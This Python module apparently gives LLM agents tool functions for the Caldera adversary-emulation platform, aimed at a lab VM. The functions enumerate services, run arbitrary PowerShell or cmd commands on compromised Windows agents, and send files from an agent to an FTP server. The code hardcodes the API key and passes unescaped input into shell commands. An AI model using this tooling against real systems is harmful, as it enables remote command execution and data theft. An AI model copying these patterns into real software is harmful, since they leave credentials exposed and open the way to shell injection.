import subprocess
from typing_extensions import Annotated
import tiktoken
import json
import utils.constants
from time import sleep
import base64
from autogen.agentchat.contrib.capabilities.context_handling import (
    truncate_str_to_tokens,
)


CALDERA_WORKING_FOLDER = utils.constants.LLM_WORKING_FOLDER + "/caldera"


def caldera_api_method_details(
    api_method: Annotated[
        str,
        "The Caldera API for which you want the full details, ALWAYS starting with /api/v2/",
    ]
) -> Annotated[str, "The details of the API method"]:

    return subprocess.check_output(
        f"curl -H 'KEY:ADMIN123' -sS http://ubuntu-vm:8888/api/docs/swagger.json | jq '.paths[\"{api_method}\"]'",
        shell=True,
        stderr=subprocess.STDOUT,
        text=True,
    )


def caldera_api_get_operation_info() -> (
    Annotated[str, "The ID of the active Caldera Operation"]
):

    command_output = subprocess.check_output(
        str(
            "curl -H 'KEY:ADMIN123' -sS http://ubuntu-vm:8888/api/operations | jq '.[0].id'"
        ),
        shell=True,
        stderr=subprocess.STDOUT,
        text=True,
    )

    return command_output.replace('"', "")


def caldera_api_request(
    api_method: Annotated[
        str,
        "The Caldera API path to request, ALWAYS starting with /api/v2/",
    ]
) -> Annotated[
    str, "The output of the API request to the Caldera server for the given API method"
]:

    command_to_run = f"curl -H 'KEY:ADMIN123' -sS http://ubuntu-vm:8888{api_method}"
    try:
        output = subprocess.check_output(
            command_to_run,
            shell=True,
            stderr=subprocess.STDOUT,
            text=True,
        )

    except subprocess.CalledProcessError as e:
        # This will be reached if the command returned a non-zero exit status
        error_output = e.output  # The error output is stored in the output attribute
        return_code = e.returncode  # You can also get the return code of the command
        # Handle the error output and return code as needed
        return_info = (
            f"The command '{command_to_run}' failed with exit code {return_code}."
        )
        return_info += "Error output:"
        return_info += error_output
    else:
        # This will be reached if the command was successful
        # The output variable contains the command's output
        return_info = "The command was successful with the following output:"
        return_info += output

    # Truncate the output to 1000 characters
    # Also print a message to indicate that the output was truncated including the number of characters
    # TODO: Investigate why MessageTokenLimiter is not working as expected for this!
    encoding = tiktoken.encoding_for_model("gpt-3.5-turbo")
    return truncate_str_to_tokens(return_info, 4000)


def caldera_swagger_info() -> Annotated[
    str,
    "The list of all available Caldera API methods along with a description of their functionality",
]:

    return subprocess.check_output(
        str(
            "curl -H 'KEY:ADMIN123' -sS http://ubuntu-vm:8888/api/docs/swagger.json | jq '.paths | to_entries[] | {path: .key, description: .value | to_entries[] | .value.description}'"
        ),
        shell=True,
        stderr=subprocess.STDOUT,
        text=True,
    )


def caldera_service_list(
    agent_paw: Annotated[
        str,
        "The Caldera agent paw from which the file should be uploaded",
    ],
    operation_id: Annotated[str, "The ID of the Caldera operation"],
) -> Annotated[
    str,
    "The list of all running services on the Caldera agent",
]:
    return caldera_execute_command_on_agent(
        agent_paw,
        operation_id,
        "Get-WmiObject Win32_Service | ?  {($_.State -eq 'Running')} | select Name, PathName",
    )


def caldera_upload_file_from_agent(
    agent_paw: Annotated[
        str,
        "The Caldera agent paw from which the file should be uploaded",
    ],
    operation_id: Annotated[str, "The ID of the Caldera operation"],
    file_path: Annotated[str, "The full path of the file to upload"],
) -> Annotated[
    str,
    "The result of the upload operation",
]:
    # Get base name of the file
    basename = file_path.split("\\")[-1]

    command = f"""$ftp = 'ftp://{utils.constants.FTP_SERVER_ADDRESS}/{basename}'; 
    $user = '{utils.constants.FTP_SERVER_USER}'; $pass = '{utils.constants.FTP_SERVER_PASS}'; $webclient = New-Object System.Net.WebClient; 
    $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass); 
    $webclient.UploadFile($ftp, '{file_path}')
    """

    print(command)
    response = caldera_execute_command_on_agent(
        agent_paw, operation_id, command, name="psh"
    )

    return response


def caldera_execute_command_on_agent(
    agent_paw: Annotated[
        str,
        "The Caldera agent paw on which the command should be executed",
    ],
    operation_id: Annotated[str, "The ID of the Caldera operation"],
    command: Annotated[str, "The command to execute"],
    name: Annotated[str, "Can be psh (PowerShell) or cmd (command prompt)"] = "psh",
) -> Annotated[
    str,
    "The output of the command executed on the Caldera agent",
]:

    command_arguments = {
        "paw": agent_paw,
        "executor": {
            "name": name,
            "platform": "windows",
            "command": command,
            "timeout": "120",
        },
    }

    # Write the command to a file
    # Create the folder if it does not exist
    subprocess.run(f"mkdir -p {CALDERA_WORKING_FOLDER}", shell=True)
    with open(CALDERA_WORKING_FOLDER + "/parameters.json", "w") as f:
        f.write(json.dumps(command_arguments))

    command_template = f"""
            curl -s 'http://ubuntu-vm:8888/api/v2/operations/{operation_id}/potential-links' \
            -H 'KEY: ADMIN123' \
            -H 'Content-Type: application/json' \
            --data-binary @{CALDERA_WORKING_FOLDER}/parameters.json
            """

    try:
        command_output = subprocess.check_output(
            str(command_template), shell=True, stderr=subprocess.STDOUT, text=True
        )

        # Try to load the output as JSON
        try:
            parsed_json = json.loads(command_output)
        except Exception as e:
            return f"An error occurred while parsing the result of the command as JSON. Output: {command_output}"

        # Check if the "id" parameter is in the parsed JSON
        if "id" not in parsed_json:
            return (
                "Command did not execute successfully, you should try again after fixing it: "
                + command_output
            )

        # Extract the link ID from the response
        link_id = parsed_json["id"]

        # Initialize the status
        status = -3  # the default value
        # Loop until the status changes
        while True:
            final_command = f"""
                    curl -s 'http://ubuntu-vm:8888/api/v2/operations/{operation_id}/links/{link_id}/result' \
                    -H 'KEY: ADMIN123'
                    """
            # Sleep for 1 second before checking the status again
            # Parse output
            command_output = subprocess.check_output(
                str(final_command), shell=True, stderr=subprocess.STDOUT, text=True
            )
            result_json = json.loads(command_output)

            if (
                "status" in result_json["link"]
                and result_json["link"]["status"] != status
            ):
                # If the status has changed, break out of the loop
                status = result_json["link"]["status"]
                break
            else:
                # If the status has not changed, sleep for 1 second before checking again
                sleep(1)
        # Check if the output is valid JSON
        try:  # Try to decode the output
            return_value = "Command output: " + base64.b64decode(
                json.loads(command_output)["result"]
            ).decode("utf-8")
        except json.JSONDecodeError as e:
            # If the output is not valid JSON, return the original output
            return_value = "Command output: " + command_output

    except json.JSONDecodeError as e:
        # If the output is not valid JSON, return the original output
        return_value = e
    except subprocess.CalledProcessError as e:
        # Handle potential errors from the subprocess call
        return_value = str(e)

    return str(return_value)
